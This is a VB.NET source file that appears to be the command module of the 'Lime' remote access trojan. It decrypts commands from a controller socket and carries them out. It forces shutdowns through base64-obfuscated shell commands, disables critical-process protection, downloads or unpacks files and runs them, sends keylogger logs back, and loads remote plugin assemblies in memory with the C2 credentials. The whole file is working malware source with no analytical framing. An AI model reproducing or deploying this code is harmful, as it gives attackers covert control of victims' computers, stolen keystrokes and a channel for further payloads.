Namespace Lime

    Public Class C_Commands

        Private Shared SPL = C_Settings.SPL
        Private Shared C As New C_Socket

        Public Shared Sub Data(ByVal b As Byte())
            Dim EN As String = C_Encryption.AES_Decrypt(BS(b))
            Dim A As String() = Split(EN, SPL)

            Try
                Select Case A(0)

                    Case "!P"
                        C.Send("!P")

                    Case "PC-"
                        Select Case A(1)
                            Case "1"
                                Shell(BS(Convert.FromBase64String("U2h1dGRvd24gL3IgL2YgL3QgMDA=")), AppWinStyle.Hide, False, -1) 'Shutdown /r /f /t 00
                            Case "2"
                                Shell(BS(Convert.FromBase64String("U2h1dGRvd24gL3MgL2YgL3QgMDA=")), AppWinStyle.Hide, False, -1) 'Shutdown /s /f /t 00
                            Case "3"
                                Shell(BS(Convert.FromBase64String("U2h1dGRvd24gL2wgL2Y=")), AppWinStyle.Hide, False, -1) 'Shutdown /l /f
                        End Select

                    Case "CL-"
                        Select Case A(1)
                            Case "1"
                                C_CriticalProcesses.CriticalProcesses_Disable()
                                End
                            Case "2"
                                C_CriticalProcesses.CriticalProcesses_Disable()
                                Diagnostics.Process.Start(C_Settings.fullpath)
                                End
                            Case "3"
                                C_Installation.DEL()
                            Case "4"
                                Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(2))
                                IO.File.WriteAllBytes(NewFile, GZip(Convert.FromBase64String(A(3)), False))
                                Threading.Thread.CurrentThread.Sleep(1000)
                                Diagnostics.Process.Start(NewFile)
                                C_Installation.DEL()
                            Case "5"
                                Dim NewFile = IO.Path.GetTempFileName + A(3)
                                Dim WC As New Net.WebClient
                                WC.DownloadFile(A(2), NewFile)
                                Threading.Thread.CurrentThread.Sleep(1000)
                                Diagnostics.Process.Start(NewFile)
                        End Select

                    Case "Visit"
                        Diagnostics.Process.Start(A(1))

                    Case "RD-"
                        Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(1))
                        IO.File.WriteAllBytes(NewFile, GZip(Convert.FromBase64String(A(2)), False))
                        Threading.Thread.CurrentThread.Sleep(1000)
                        Diagnostics.Process.Start(NewFile)

                    Case "RU-"
                        Dim NewFile = IO.Path.GetTempFileName + A(2)
                        Dim WC As New Net.WebClient
                        WC.DownloadFile(A(1), NewFile)
                        Threading.Thread.CurrentThread.Sleep(1000)
                        Diagnostics.Process.Start(NewFile)

                    Case "KL"
                        C.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(C_Keylog.filepath))

                    Case "CPL" 'check plugin
                        If GTV(A(1)) = Nothing Then
                            C.Send("GPL" + SPL + A(1))
                        Else
                            Plugin(GZip(Convert.FromBase64String(GTV(A(1))), False))
                        End If

                    Case "IPL" 'invo plugin
                        STV(A(2), A(1))
                        Plugin(GZip(Convert.FromBase64String(GTV(A(2))), False))

                End Select
            Catch ex As Exception
                C.Send("MSG" + SPL + "Error! " + ex.Message)
            End Try

        End Sub

        Public Shared Sub Plugin(ByVal B() As Byte)
            Try
                For Each Type_ As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                    For Each GM In Type_.GetMethods
                        If GM.Name = "CN" Then
                            GM.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.KEY, C_Socket.SPL, C_Settings.PASS, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
                        End If
                    Next
                Next
            Catch ex As Exception
                C.Send("MSG" + SPL + "Plugin Error! " + ex.Message)
            End Try
        End Sub

    End Class

End Namespace